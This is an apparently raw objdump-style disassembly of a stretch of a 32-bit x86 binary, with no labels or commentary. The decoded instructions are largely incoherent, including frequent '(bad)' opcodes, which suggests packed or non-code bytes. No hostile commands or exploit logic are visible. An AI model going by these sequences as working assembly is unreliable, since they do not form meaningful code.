  40a1f7:	inc    DWORD PTR [ebx-0x7c76cdc2]
  40a1fd:	cmp    al,0x92
  40a1ff:	cmp    edi,0x6f
  40a202:	lods   eax,DWORD PTR ds:[esi]
  40a203:	(bad)  
  40a204:	dec    DWORD PTR [esi]
  40a206:	(bad)  
  40a207:	inc    DWORD PTR [eax]
  40a209:	iret   
  40a20a:	data16 (bad) 
  40a20c:	call   FWORD PTR [edi+edx*2]
  40a20f:	mov    DWORD PTR [ebx-0xb126],eax
  40a215:	or     al,0xb6
  40a217:	inc    DWORD PTR [eax]
  40a219:	(bad)  
  40a21b:	add    bh,bh
  40a21d:	fld    DWORD PTR [eax-0x7d]
  40a220:	push   eax
  40a222:	adc    edi,edi
  40a224:	add    BYTE PTR [eax+0x35],bh
  40a227:	inc    DWORD PTR [ebx-0xff4c7e]
  40a22d:	(bad)  
  40a22e:	loope  0x40a230
  40a230:	call   FWORD PTR [esi-0x7f]
  40a233:	inc    DWORD PTR [eax]
  40a235:	pusha  
  40a236:	in     al,dx
  40a237:	add    BYTE PTR [eax],al
  40a239:	popf   
  40a23a:	jno    0x40a23c
  40a23c:	inc    esp
  40a23e:	out    0xff,al
  40a240:	push   DWORD PTR [eax]
  40a242:	xchg   edx,eax
  40a243:	add    bh,bh
  40a245:	cdq    
  40a246:	push   cs
  40a247:	add    BYTE PTR [ebx-0xffc569],al
  40a24d:	fwait
  40a24e:	imul   eax,DWORD PTR [ebx+0x73fe00],0xffffffff
  40a255:	mov    ah,0xbc
  40a257:	dec    esp
  40a259:	adc    eax,0x7eccff16
  40a25e:	push   eax
  40a25f:	add    ah,cl
  40a261:	push   ss
  40a262:	add    BYTE PTR [ebx-0x7ccb9300],0x89
  40a269:	pop    ss
  40a26a:	cmc    
  40a26b:	(bad)  
  40a26c:	jmp    DWORD PTR [esi]
  40a26e:	inc    ebp
  40a26f:	inc    DWORD PTR [eax]
  40a271:	call   0xdd3fa2d5
  40a276:	sub    eax,0xe4320000
  40a27b:	inc    DWORD PTR [eax]
  40a27d:	dec    esi
  40a27e:	sub    bh,bh
  40a280:	add    BYTE PTR [ebx+0xa],bl
  40a283:	add    bh,bh
  40a285:	rol    DWORD PTR [esi+0x1900ffff],1
  40a28b:	inc    DWORD PTR [ebx-0x76ff8d17]
  40a291:	jo     0x40a220
  40a293:	add    BYTE PTR [eax],al
  40a295:	outs   dx,BYTE PTR ds:[esi]
  40a296:	cld    
  40a297:	cmp    edi,0x31
  40a29a:	aas    
  40a29b:	add    BYTE PTR [eax],al
  40a29d:	aad    0xca
  40a29f:	add    bh,bh
  40a2a1:	mov    cl,0x8d
  40a2a3:	add    BYTE PTR [eax],al
  40a2a5:	xor    al,BYTE PTR [edx-0x45187d00]
  40a2ab:	(bad)  
  40a2ac:	inc    DWORD PTR [ebx-0x3c]
  40a2af:	add    bh,bh
  40a2b1:	mov    dl,0x2a
  40a2b3:	add    bh,bh
  40a2b5:	or     DWORD PTR [ebx],edi
  40a2b7:	inc    DWORD PTR [eax]
  40a2b9:	mov    edi,DWORD PTR [esi-0x34]
  40a2bc:	add    BYTE PTR [eax-0xb7c7c12],al
  40a2c2:	rol    BYTE PTR [ebx-0x9a9834],1
  40a2c8:	jmp    FWORD PTR [eax+ebp*8-0x1]
  40a2cc:	add    BYTE PTR [esi-0x6000000a],cl
  40a2d2:	out    0x0,al
  40a2d4:	add    BYTE PTR [edi+ebx*2-0x1],al
  40a2d8:	add    BYTE PTR [eax+0x3ffff58],bl
  40a2de:	stc    
  40a2df:	add    DWORD PTR [eax],0x11
  40a2e2:	daa    
  40a2e3:	add    DWORD PTR [eax],0x68
  40a2e6:	cwde   
  40a2e7:	int3   
  40a2e8:	dec    DWORD PTR [eax]
  40a2ea:	stc    
  40a2eb:	(bad)  
  40a2ec:	jmp    DWORD PTR [ebp+0x3589ff40]
  40a2f2:	jae    0x40a2f3
  40a2f4:	sbb    DWORD PTR [esi+0x3c00cc1f],0x34
  40a2fb:	add    bh,bh
  40a2fd:	xor    BYTE PTR [ebp+0x5bb7ccff],ah
  40a303:	int3   
  40a304:	add    cl,ah
  40a306:	in     al,dx
  40a307:	add    DWORD PTR [ebx+0xff2be3],0xffffffd2
  40a30e:	into   
  40a30f:	(bad)  
  40a310:	jmp    DWORD PTR [ebp+0x7c00ff5f]
  40a316:	xor    eax,DWORD PTR [eax]
  40a318:	inc    DWORD PTR [eax+0xd]
  40a31b:	cmp    edi,0x65
  40a31e:	mov    edi,edi
  40a320:	push   DWORD PTR [eax-0x1effffbb]
  40a326:	mov    ah,0x0
  40a328:	add    bh,cl
  40a32a:	cmp    bh,0xff
  40a32d:	out    0xf,eax
  40a32f:	add    ah,cl
  40a331:	xor    al,0x28
  40a333:	cmp    edi,0x2
  40a336:	xchg   ecx,eax
  40a337:	int3   
  40a338:	(bad)  
  40a339:	fmul   QWORD PTR [edi]
  40a33b:	(bad)  
  40a33c:	inc    DWORD PTR [ebx-0x6f00ff61]
  40a342:	and    eax,DWORD PTR [eax]
  40a344:	or     DWORD PTR [ecx-0x56],0x0
  40a348:	jmp    DWORD PTR [eax+eiz*4]
  40a34b:	(bad)  
  40a34c:	push   DWORD PTR [esi-0x2e00337a]
  40a352:	sbb    ah,cl
  40a354:	adc    DWORD PTR [eax-0x69],0xffffff89
  40a358:	inc    DWORD PTR [eax+0x7ffcca9]
  40a35e:	add    edi,edi
  40a360:	adc    DWORD PTR [edi],0xffffff87
  40a363:	int3   
  40a364:	jmp    FWORD PTR [eax+0x5f]
  40a367:	mov    esp,ecx
  40a369:	test   al,0x83
  40a36b:	inc    DWORD PTR [ebx-0xff949d]
  40a371:	jb     0x40a3b8
  40a373:	add    BYTE PTR [eax],al
  40a375:	inc    esp
  40a376:	mov    edi,0xa9ccff83
  40a37b:	add    DWORD PTR [eax],0xffffffb3
  40a37e:	mov    al,0xff
  40a380:	add    dh,bl
  40a382:	pop    esi
  40a383:	(bad)  
  40a384:	(bad)  
  40a385:	jmp    0xac:0x1800cc71
  40a38c:	mov    DWORD PTR [ebx],eax
  40a38e:	jmp    0x40a38f
  40a390:	jmp    FWORD PTR [esp+esi*2]
  40a393:	add    bh,bh
  40a395:	pop    es
  40a396:	xchg   edx,eax
  40a397:	add    BYTE PTR [eax],al
  40a399:	xlat   BYTE PTR ds:[ebx]
  40a39a:	fadd   DWORD PTR [eax]
  40a39c:	int3   
  40a39d:	xchg   edx,eax
  40a39e:	(bad)  
  40a39f:	(bad)  
  40a3a0:	(bad)  
  40a3a1:	stc    
  40a3a2:	add    DWORD PTR [bx+si],0x62
  40a3a6:	push   ebp
  40a3a7:	(bad)  
  40a3a8:	jmp    FWORD PTR [ebx+0x6dff0078]
  40a3ae:	fwait
  40a3af:	add    ah,cl
  40a3b1:	mov    DWORD PTR [ebp+ecx*4+0x45],esi
  40a3b5:	add    BYTE PTR [eax],al
  40a3b7:	aad    0x0
  40a3b9:	int3   
  40a3ba:	aam    0x11
  40a3bc:	add    al,0xff
  40a3be:	(bad)  
  40a3bf:	(bad)  
  40a3c1:	dec    DWORD PTR [ebx]
  40a3c3:	dec    eax
  40a3c4:	xor    DWORD PTR [eax],eax
  40a3c6:	dec    DWORD PTR [ebp-0x77]
  40a3c9:	call   FWORD PTR [ecx-0x5c96]
  40a3cf:	ins    BYTE PTR es:[edi],dx
  40a3d0:	(bad)  
  40a3d1:	jmp    FWORD PTR [eax]
  40a3d3:	mov    esi,0xf6000078
  40a3d8:	(bad)  
  40a3d9:	call   FWORD PTR [ebp-0x42af]
  40a3df:	out    0x83,eax
  40a3e1:	dec    DWORD PTR [eax-0x76ff0d1d]
  40a3e7:	dec    ecx
  40a3e8:	dec    esp
  40a3ea:	add    DWORD PTR [edi+ebp*1],0x83b200ff
  40a3f1:	and    DWORD PTR [esi-0x7c0070fc],0x6d
  40a3f8:	(bad)  
  40a3f9:	call   DWORD PTR [edi-0x4a]
  40a3fc:	mov    DWORD PTR ss:[eax],eax
  40a3ff:	ds (bad) 
  40a401:	jmp    DWORD PTR [ecx-0xff3ece]
  40a407:	pushf  
  40a408:	add    BYTE PTR [eax],al
  40a40a:	jp     0x40a45f
  40a40c:	mov    es,WORD PTR [ebx-0x3300cb01]
  40a412:	mov    ebp,0x831051
  40a417:	lock (bad) 
  40a419:	(bad)  
  40a41a:	mov    edx,0x2b6b
  40a41f:	cmp    edi,edi
  40a421:	add    BYTE PTR [ebp-0xa],al
  40a424:	test   BYTE PTR [ecx-0x76002201],0x9d
  40a42b:	neg    BYTE PTR [edi-0x1]
  40a42e:	xor    DWORD PTR [eax-0x5b27007d],0x4f
  40a435:	dec    esp
  40a437:	cli    
  40a438:	inc    DWORD PTR [eax]
  40a43a:	push   eax
  40a43b:	inc    eax
  40a43c:	scas   eax,DWORD PTR es:[edi]
  40a43d:	(bad)  
  40a43e:	(bad)  
  40a43f:	cld    
  40a440:	add    BYTE PTR [eax],al
  40a442:	pop    ss
  40a443:	repz into 
  40a445:	dec    esp
  40a447:	(bad)  
  40a448:	add    bh,bh
  40a44a:	cdq    
  40a44b:	inc    edx
  40a44c:	ret    0xff89
  40a44f:	xchg   DWORD PTR [eax],eax
  40a451:	int3   
  40a452:	das    
  40a453:	jge    0x40a3f9
  40a455:	inc    DWORD PTR [ebx+0x5aff894a]
  40a45b:	ror    DWORD PTR [edi],1
  40a45d:	inc    DWORD PTR [eax]
  40a45f:	ins    DWORD PTR es:[edi],dx
  40a460:	inc    DWORD PTR [eax]
  40a462:	(bad)  
  40a463:	retf   
  40a464:	in     eax,0xcc
  40a466:	call   DWORD PTR [ecx-0x88eff01]
  40a46c:	icebp  
  40a46d:	inc    DWORD PTR [eax]
  40a46f:	ror    ah,0xff
  40a472:	hlt    
  40a473:	inc    ebx
  40a474:	jg     0x40a475
  40a476:	int3   
  40a477:	fadd   DWORD PTR [ebx-0x5c40ba01]
  40a47d:	cmp    edi,0x3f
  40a480:	add    bh,bh
  40a482:	std    
  40a483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a484:	aam    0x0
  40a486:	add    ah,bh
  40a488:	(bad)  
  40a489:	call   FWORD PTR [esi+0x53]
  40a48c:	(bad)  
  40a48d:	int3   
  40a48e:	int3   
  40a48f:	test   BYTE PTR [ecx+0x5fdbfe89],cl
  40a495:	mov    DWORD PTR [eax],eax
  40a497:	jl     0x40a498
  40a499:	(bad)  
  40a49a:	(bad)  
  40a49b:	sbb    ch,BYTE PTR [edi+edi*8-0x7c00cc34]
  40a4a2:	repz xchg esp,eax
  40a4a4:	test   al,0xff
  40a4a6:	call   DWORD PTR [esi-0x7d]
  40a4a9:	dec    DWORD PTR [edi+0xff76d2]
  40a4af:	inc    ebx
  40a4b0:	mov    DWORD PTR [ebx-0x762f869c],eax
  40a4b6:	add    ecx,0x0
  40a4b9:	call   FWORD PTR [ebp-0x76ffdad3]
  40a4bf:	inc    DWORD PTR cs:[eax]
  40a4c2:	jmp    0xcd3fe9ec
  40a4c7:	or     al,BYTE PTR [eax]
  40a4c9:	mov    DWORD PTR [edi-0x76009ee8],edi
  40a4cf:	nop
  40a4d0:	inc    DWORD PTR [ebx-0x972e7c]
  40a4d6:	xor    eax,0xffffffff
  40a4d9:	add    BYTE PTR [eax-0x10],ah
  40a4dc:	mov    bh,0x0
  40a4de:	int3   
  40a4df:	or     eax,DWORD PTR [eax]
  40a4e1:	call   DWORD PTR [edx]
  40a4e3:	ficomp WORD PTR [edi+edi*8]
  40a4e6:	push   ebp
  40a4e8:	(bad)  
  40a4e9:	push   DWORD PTR [edx]
  40a4eb:	int    0x1c
  40a4ed:	cmp    edi,0xfffffff6
  40a4f0:	add    BYTE PTR [ecx-0x9ab37f],cl
  40a4f6:	(bad)  
  40a4f7:	fmul   DWORD PTR [ecx-0xc11f801]
  40a4fd:	add    BYTE PTR [ebx+0x3f89ff67],al
  40a503:	sbb    edi,DWORD PTR [edi-0x2a0001]
  40a509:	mov    DWORD PTR [edx+0x57],eax
  40a50c:	adc    edi,edi
  40a50e:	mov    DWORD PTR [edi],ebp
  40a510:	mov    edi,edi
  40a512:	xchg   edx,eax
  40a513:	or     eax,0x588900f1
  40a518:	or     DWORD PTR [ecx-0x9cde52],0xffffffff
  40a51f:	jnp    0x40a4a4
  40a521:	call   DWORD PTR [eax-0xd50f]
  40a527:	jnp    0x40a529
  40a529:	call   DWORD PTR [ecx+0x62]
  40a52c:	and    eax,0xccc3cc00
  40a531:	jmp    DWORD PTR [ecx]
  40a533:	adc    ecx,edi
  40a535:	inc    DWORD PTR [ebx-0x540033d3]
  40a53b:	mov    ah,0x8d
  40a53d:	inc    DWORD PTR [ebx-0x1000ffca]
  40a543:	inc    ecx
  40a544:	add    eax,DWORD PTR [eax]
  40a546:	push   edi
  40a548:	cmp    edi,0xd
  40a54b:	in     eax,0x20
  40a54d:	int3   
  40a54e:	xor    DWORD PTR [edx+0x0],0xffffffff
  40a552:	cmp    al,0x81
  40a554:	inc    edx
  40a555:	add    BYTE PTR [eax],al
  40a557:	fmul   DWORD PTR [ecx-0x1bb28934]
  40a55d:	inc    DWORD PTR [eax]
  40a55f:	call   0x835c:0x4834ff89
  40a566:	add    BYTE PTR [eax],ah
  40a568:	cmp    edi,0xffffffdc
  40a56b:	or     DWORD PTR [eax+0x0],edx
  40a56e:	add    BYTE PTR [eax],bh
  40a570:	add    DWORD PTR [eax],0xffffffd4
  40a573:	sub    al,0xbf
  40a575:	(bad)  
  40a576:	jmp    DWORD PTR [esi-0x1]
  40a579:	add    BYTE PTR [edx],dh
  40a57b:	mov    eax,ds:0x580000b8
  40a580:	int3   
  40a581:	call   FWORD PTR [ebp-0x26]
  40a584:	push   ebp
  40a585:	add    bh,bh
  40a587:	out    dx,al
  40a588:	dec    esp
  40a58a:	addr16 sbb cl,bl
  40a58d:	or     esp,0x2
  40a590:	inc    DWORD PTR [eax]
  40a592:	dec    edi
  40a593:	in     eax,0xfc
  40a595:	inc    DWORD PTR [ebx-0x3900766f]
  40a59b:	xor    BYTE PTR [eax+eax*1+0x83daff],cl
  40a5a2:	adc    esi,esi
  40a5a4:	mov    edi,edi
  40a5a6:	add    BYTE PTR [edi],ah
  40a5a8:	inc    DWORD PTR [eax]
  40a5aa:	sub    BYTE PTR [edi-0x11],cl
  40a5ad:	add    bh,bh
  40a5af:	xor    eax,0xbdd9ccff
  40a5b4:	out    dx,al
  40a5b5:	add    bh,bh
  40a5b7:	pop    DWORD PTR [eax]
  40a5b9:	push   DWORD PTR [ebx+0xffe038]
  40a5bf:	mov    ecx,0x9238ff00
  40a5c4:	ret    0xff83
  40a5c7:	push   ebx
  40a5c8:	inc    DWORD PTR [ebx-0x14c9f6]
  40a5ce:	push   DWORD PTR [eax-0x1]
  40a5d1:	add    dl,ch
  40a5d3:	jmp    0x40a623
  40a5d5:	cmp    edi,0x40
  40a5d8:	add    DWORD PTR [ebx-0x95ee78],0xffffffff
  40a5df:	mov    ch,0xff
  40a5e1:	mov    DWORD PTR [esi-0x63],ebx
  40a5e4:	ror    BYTE PTR [ecx+0xff3aff],cl
  40a5ea:	or     ebx,eax
  40a5ec:	daa    
  40a5ed:	add    BYTE PTR [eax],al
  40a5ef:	ins    BYTE PTR es:[edi],dx
  40a5f0:	(bad)  
  40a5f1:	jmp    DWORD PTR [ebp-0x33ff0575]
  40a5f7:	and    edi,edi
  40a5f9:	add    BYTE PTR [esi-0x6b],ah
  40a5fc:	add    DWORD PTR ds:[eax],0x73
  40a600:	(bad)  
  40a601:	jmp    DWORD PTR [esi+ebp*8+0x2200cc90]
  40a608:	dec    esp
  40a60a:	adc    DWORD PTR [esp+eax*2-0x7d],edx
  40a60e:	and    DWORD PTR [edx+0x103ffff],0xffffff81
  40a615:	add    BYTE PTR [eax],al
  40a617:	cli    
  40a618:	add    DWORD PTR [ebx-0xae7f26],0xffffffff
  40a61f:	repz inc DWORD PTR [ebx-0x7c91e43b]
  40a626:	add    ch,bl
  40a628:	(bad)  
  40a629:	call   FWORD PTR [edx-0x7cff42e8]
  40a62f:	cmp    bh,0xff
  40a632:	mov    eax,0xff00bab7
  40a637:	cmp    edi,edi
  40a639:	or     DWORD PTR [edi],0x29
  40a63c:	dec    esi
  40a63d:	add    bh,bh
  40a63f:	jp     0x40a640
  40a641:	add    al,dh
  40a643:	xor    DWORD PTR [ebp-0x7c640001],edx
  40a649:	dec    edi
  40a64b:	jno    0x40a5fa
  40a64d:	add    BYTE PTR [eax],al
  40a64f:	pop    DWORD PTR [eax]
  40a651:	mov    DWORD PTR [esi-0x29],ebx
  40a654:	lahf   
  40a655:	(bad)  
  40a656:	push   DWORD PTR [esi]
  40a658:	(bad)  
  40a659:	jmp    DWORD PTR [esi+0x60]
  40a65c:	lods   al,BYTE PTR ds:[esi]
  40a65d:	add    bh,bh
  40a65f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a660:	inc    DWORD PTR [ebx-0xec3be3]
  40a666:	int3   
  40a667:	pop    ds
  40a668:	inc    DWORD PTR [ebx-0x61c5ed]
  40a66e:	add    dh,ah
  40a670:	mov    edi,edi
  40a672:	in     eax,dx
  40a673:	jge    0x40a61e
  40a675:	add    bh,bh
  40a677:	jle    0x40a602
  40a679:	int3   
  40a67a:	dec    edi
  40a67b:	jb     0x40a6d1
  40a67d:	add    BYTE PTR [ebx-0x600000c5],al
  40a683:	call   0xea41a5ba
  40a688:	mov    DWORD PTR [eax],eax
  40a68a:	add    ebp,DWORD PTR [ecx]
  40a68c:	into   
  40a68d:	int3   
  40a68e:	add    BYTE PTR [edx-0x7d],dh
  40a691:	call   DWORD PTR [ebp-0x23]
  40a694:	stos   DWORD PTR es:[edi],eax
  40a695:	or     esp,0xffffffa7
  40a698:	int3   
  40a699:	sbb    DWORD PTR [edi+0x46],0xffffffba
  40a69d:	add    bh,bh
  40a69f:	jg     0x40a6a1
  40a6a1:	push   DWORD PTR [ecx+0x7c]
  40a6a4:	mov    al,0xff
  40a6a6:	add    BYTE PTR [eax-0x1],al
  40a6a9:	add    BYTE PTR [edi],dl
  40a6ab:	adc    edi,edx
  40a6ad:	dec    DWORD PTR [ecx-0x6f000027]
  40a6b3:	add    eax,0xce83ff8f
  40a6b8:	(bad)  
  40a6b9:	push   DWORD PTR [ecx]
  40a6bb:	inc    ecx
  40a6bc:	mov    ds:0xaffcc,eax
  40a6c1:	(bad)  
  40a6c2:	mov    ecx,0x19f8
  40a6c7:	in     eax,0xcc
  40a6c9:	mov    DWORD PTR [ebp-0x2c],ecx
  40a6cc:	add    DWORD PTR [eax],0xffffff83
  40a6cf:	push   esi
  40a6d0:	(bad)  
  40a6d1:	jmp    DWORD PTR [ebp-0xfff1e6]
  40a6d7:	in     al,0xff
  40a6d9:	inc    DWORD PTR [edx-0x12]
  40a6dc:	and    al,0xff
  40a6de:	add    BYTE PTR [edi-0x7639ff01],ch
  40a6e4:	fcmovne st,st(4)
  40a6e6:	push   ecx
  40a6e8:	mov    edi,edi
  40a6ea:	mov    eax,0xffe446
  40a6ef:	xchg   edi,eax
  40a6f0:	inc    DWORD PTR [eax]
  40a6f2:	dec    ebx
  40a6f3:	xchg   edx,eax
  40a6f4:	pop    ecx
  40a6f5:	mov    DWORD PTR [eax],eax
  40a6f7:	sub    eax,DWORD PTR [ebx+0x55ec6a89]
  40a6fd:	(bad)  
  40a6fe:	dec    DWORD PTR [edx-0x2df27677]
  40a704:	jp     0x40a706
  40a706:	and    DWORD PTR [ecx-0x79f9ff34],0xfffffff5
  40a70d:	inc    DWORD PTR [eax]
  40a70f:	cmp    edi,edi
  40a711:	add    BYTE PTR [edi+ebp*8+0x6b],dh
  40a715:	dec    DWORD PTR [ecx-0x5600ff88]
  40a71b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a71c:	adc    edi,edi
  40a71e:	add    BYTE PTR [edx-0x77],ah
  40a721:	inc    DWORD PTR [ebx-0x3b]
  40a724:	dec    esp
  40a725:	inc    DWORD PTR [eax]
  40a727:	outs   dx,DWORD PTR ds:[esi]
  40a728:	dec    DWORD PTR [ecx+0x4f34f4]
  40a72e:	mov    DWORD PTR [esi+0x52eb8383],esi
  40a734:	iret   
  40a735:	add    bh,bh
  40a737:	sub    ah,cl
  40a739:	inc    DWORD PTR [eax-0x8]
  40a73c:	inc    ecx
  40a73d:	add    BYTE PTR [ecx-0x260000ea],cl
  40a743:	xor    ch,0xff
  40a746:	jmp    FWORD PTR ds:0x628fffff
  40a74c:	and    eax,0xad00ff
  40a751:	dec    edx
  40a753:	inc    ecx
  40a754:	pop    ds
  40a755:	add    bh,bh
  40a757:	int    0xff
  40a759:	mov    DWORD PTR [esi-0x6e35],esi
  40a75f:	cmc    
  40a760:	(bad)  
  40a761:	(bad)  
  40a762:	jp     0x40a7d3
  40a764:	stos   DWORD PTR es:[edi],eax
  40a765:	(bad)  
  40a766:	call   FWORD PTR [eax+0x4d9900ff]
  40a76c:	pop    ebx
  40a76d:	(bad)  
  40a76e:	dec    esi
  40a770:	(bad)  
  40a771:	call   DWORD PTR [ebp-0x7c209e]
  40a777:	outs   dx,BYTE PTR ds:[esi]
  40a778:	cmp    edi,0xffffffbc
  40a77b:	fcomp  DWORD PTR [edi-0x2b3400]
  40a781:	add    BYTE PTR [esi],cl
  40a783:	and    al,0x41
  40a785:	inc    DWORD PTR [ebx+0x4fffff43]
  40a78b:	inc    ecx
  40a78c:	add    DWORD PTR [eax],eax
  40a78e:	push   ebp
  40a790:	mov    DWORD PTR [eax],eax
  40a792:	xor    DWORD PTR [edx-0x4500003b],esp
  40a798:	(bad)  
  40a799:	push   DWORD PTR [ecx-0xde59]
  40a79f:	stos   BYTE PTR es:[edi],al
  40a7a0:	(bad)  
  40a7a1:	call   FWORD PTR [eax]
  40a7a3:	add    BYTE PTR [edi+edi*8],dl
  40a7a6:	call   FWORD PTR [edi]
  40a7a8:	add    BYTE PTR [eax],al
  40a7aa:	dec    edi
  40a7ab:	xlat   BYTE PTR ds:[ebx]
  40a7ac:	or     DWORD PTR [eax],eax
  40a7ae:	call   FWORD PTR [edx]
  40a7b0:	add    BYTE PTR [eax],al
  40a7b2:	pop    eax
  40a7b3:	ins    DWORD PTR es:[edi],dx
  40a7b4:	pop    esp
  40a7b5:	add    BYTE PTR [ecx-0x39000092],cl
  40a7bb:	push   0xffffffc0
  40a7bd:	mov    edi,edi
  40a7bf:	cwde   
  40a7c0:	(bad)  
  40a7c1:	inc    DWORD PTR [esi-0x7e9f]
  40a7c7:	xchg   edx,eax
  40a7c8:	inc    DWORD PTR [eax]
  40a7ca:	pushf  
  40a7cb:	lea    ebp,[esi]
  40a7cd:	(bad)  
  40a7ce:	call   FWORD PTR ds:0xf4f48900
  40a7d4:	cmp    eax,DWORD PTR [eax]
  40a7d6:	(bad)  
  40a7d7:	jmp    0xa4:0xd0b00083
  40a7de:	mov    DWORD PTR [ecx+ecx*4],esp
  40a7e1:	mov    DWORD PTR [ebp-0x47],ebp
  40a7e4:	mov    bl,0xff
  40a7e6:	call   FWORD PTR [edi+edi*8-0x77]
  40a7ea:	add    ebx,DWORD PTR [edx+0x2b]
  40a7ed:	inc    DWORD PTR [eax]
  40a7ef:	inc    DWORD PTR cs:[eax]
  40a7f2:	test   al,0xd8
  40a7f4:	xchg   ebp,eax
  40a7f5:	inc    DWORD PTR [ebx+0x300ffa8]
  40a7fb:	repnz loopne 0x40a787
  40a7fe:	jmp    DWORD PTR [ebp+0x0]
  40a801:	add    BYTE PTR [edi+0x15],ch
  40a804:	into   
  40a805:	inc    DWORD PTR [eax]
  40a807:	test   DWORD PTR [eax],0x2d765cff
  40a80d:	add    BYTE PTR [eax],al
  40a80f:	jmp    0x6572a797
  40a814:	test   edi,edi
  40a816:	int3   
  40a817:	sti    
  40a818:	add    BYTE PTR [ebx-0x7ce32e1e],al
  40a81e:	int3   
  40a81f:	retf   
  40a820:	(bad)  
  40a821:	(bad)  
  40a822:	mov    ecx,0xff9d27
  40a827:	pop    ecx
  40a828:	add    DWORD PTR [ebx-0xa3c9b],0xffffffff
  40a82f:	ins    BYTE PTR es:[edi],dx
  40a830:	int3   
  40a831:	add    BYTE PTR [ecx],bl
  40a833:	(bad)  
  40a834:	out    dx,eax
  40a835:	(bad)  
  40a836:	jmp    edi
  40a838:	add    BYTE PTR [eax],al
  40a83a:	loope  0x40a8a1
  40a83c:	out    0x0,al
  40a83e:	adc    edi,0xffffff83
  40a841:	adc    DWORD PTR [ebp+edi*4-0x2f],0xffffff83
  40a846:	add    BYTE PTR [ebx+eax*4],al
  40a849:	call   FWORD PTR [edi-0x7c0007bf]
  40a84f:	jl     0x40a850
  40a851:	sbb    ebp,0xffffffdf
  40a854:	push   ecx
  40a855:	(bad)  
  40a856:	call   esi
  40a858:	int3   
  40a859:	or     DWORD PTR [ecx],0xfffffffd
  40a85c:	ins    BYTE PTR es:[edi],dx
  40a85d:	or     DWORD PTR [ecx-0x72ffff0f],0x2a
  40a864:	inc    esp
  40a865:	inc    DWORD PTR [ebx+0x22ff003e]
  40a86b:	out    0xc4,eax
  40a86d:	dec    DWORD PTR [ecx+0x7900ffc1]
  40a873:	out    0xfe,al
  40a875:	(bad)  
  40a876:	(bad)  
  40a877:	jg     0x40a878
  40a879:	add    BYTE PTR [edx+0x1a11],bl
  40a87f:	imul   eax,DWORD PTR [eax],0x0
  40a882:	or     DWORD PTR [ebx],ecx
  40a884:	outs   dx,DWORD PTR ds:[esi]
  40a885:	or     esp,0xffffff8f
  40a888:	inc    DWORD PTR [eax]
  40a88a:	cmp    ch,ah
  40a88c:	and    DWORD PTR [eax],eax
  40a88e:	int3   
  40a88f:	pop    esi
  40a890:	add    BYTE PTR [eax],al
  40a892:	jp     0x40a830
  40a894:	dec    esp
  40a895:	add    DWORD PTR [eax],0xffffffd4
  40a898:	add    bh,bh
  40a89a:	call   0xcc0a:0xff0bde
  40a8a1:	dec    DWORD PTR [ebx+0x2e]
  40a8a4:	ja     0x40a8a5
  40a8a6:	call   DWORD PTR [edi+0x6a10ff00]
  40a8ac:	test   al,0x0
  40a8ae:	add    BYTE PTR [edx-0x1],bh
  40a8b1:	call   ebx
  40a8b3:	movsx  ecx,BYTE PTR [ecx-0x76334801]
  40a8ba:	mov    ebp,0xff00a951
  40a8bf:	aaa    
  40a8c0:	add    bh,bh
  40a8c2:	push   esi
  40a8c3:	cli    
  40a8c4:	or     al,0xff
  40a8c6:	add    BYTE PTR [esi+0x0],ah
  40a8c9:	(bad)  
  40a8ca:	jg     0x40a89c
  40a8cc:	pop    es
  40a8cd:	dec    esp
  40a8cf:	add    bh,bh
  40a8d1:	dec    DWORD PTR [edx]
  40a8d3:	mov    esi,0x50ffff50
  40a8d8:	inc    DWORD PTR [eax]
  40a8da:	sbb    al,0x4a
  40a8dc:	add    cl,BYTE PTR [ecx+0x73ff]
  40a8e2:	fld    QWORD PTR [ebx]
  40a8e5:	inc    DWORD PTR [ebx-0x876001f]
  40a8eb:	mov    eax,0x178900bf
  40a8f0:	add    BYTE PTR [eax],al
  40a8f2:	pop    ebp
  40a8f3:	xchg   BYTE PTR [edi+edi*8],dh
  40a8f6:	add    bl,ch
  40a8f8:	int3   
  40a8f9:	(bad)  
  40a8fa:	jmp    0x40a92c
  40a8fc:	mov    eax,0x893effff
  40a901:	int3   
  40a902:	shl    BYTE PTR [ebx-0x3f00000c],0x89
  40a909:	xor    DWORD PTR [esi+ebx*8-0x6a],0xffffffff
  40a90e:	jmp    edi
  40a910:	int3   
  40a911:	dec    DWORD PTR [ecx]
  40a913:	jge    0x40a97c
  40a915:	(bad)  
  40a916:	dec    DWORD PTR [edx+0x0]
  40a919:	inc    DWORD PTR [ebx]
  40a91b:	pop    ecx
  40a91c:	sub    eax,0x83e2ff83
  40a921:	push   DWORD PTR [eax+0x11]
  40a924:	or     bh,bh
  40a926:	call   DWORD PTR [edx]
  40a928:	inc    DWORD PTR [eax]
  40a92a:	mov    ebx,0x83ff882d
  40a92f:	sub    al,0x0
  40a931:	add    BYTE PTR [edx+0x63],dh
  40a934:	rol    BYTE PTR [ebx+0x40cc],1
  40a93a:	jge    0x40a93b
  40a93c:	adc    BYTE PTR [ecx+0x2dff],cl
  40a942:	jo     0x40a8fb
  40a944:	repnz inc DWORD PTR [ebx+0x1affff3f]
  40a94b:	mov    al,ds:0x3dffff3c
  40a950:	(bad)  
  40a951:	dec    ebx
  40a953:	mov    ebx,0xbb00ffee
  40a958:	add    BYTE PTR [eax],al
  40a95a:	jo     0x40a933
  40a95c:	lock int3 
  40a95e:	int3   
  40a95f:	cld    
  40a960:	int3   
  40a961:	inc    eax
  40a963:	jne    0x40a91e
  40a965:	cmp    edi,0xffffffc6
  40a968:	(bad)  
  40a969:	inc    DWORD PTR [ebp-0x64]
  40a96c:	mov    ds:0x8362ff00,al
  40a971:	call   FWORD PTR [edi-0x2d]
  40a974:	adc    al,0xff
  40a976:	push   DWORD PTR [esi-0x4ac93400]
  40a97c:	hlt    
  40a97d:	inc    DWORD PTR [eax]
  40a97f:	or     bh,bh
  40a981:	(bad)  
  40a982:	sti    
  40a983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a984:	jae    0x40a985
  40a986:	add    BYTE PTR [eax+0x1645ffff],dl
  40a98c:	test   al,0xff
  40a98e:	jmp    FWORD PTR [eax+eax*1-0x1]
  40a992:	inc    esi
  40a993:	adc    dh,dl
  40a995:	inc    DWORD PTR [eax]
  40a997:	ss dec esp
  40a99a:	aas    
  40a99b:	bound  esp,QWORD PTR [edi+edi*8]
  40a99e:	add    BYTE PTR [edi-0x34],ah
  40a9a1:	call   FWORD PTR [ecx+0xff6e20]
  40a9a7:	jecxz  0x40a92c
  40a9a9:	inc    DWORD PTR [eax-0x23]
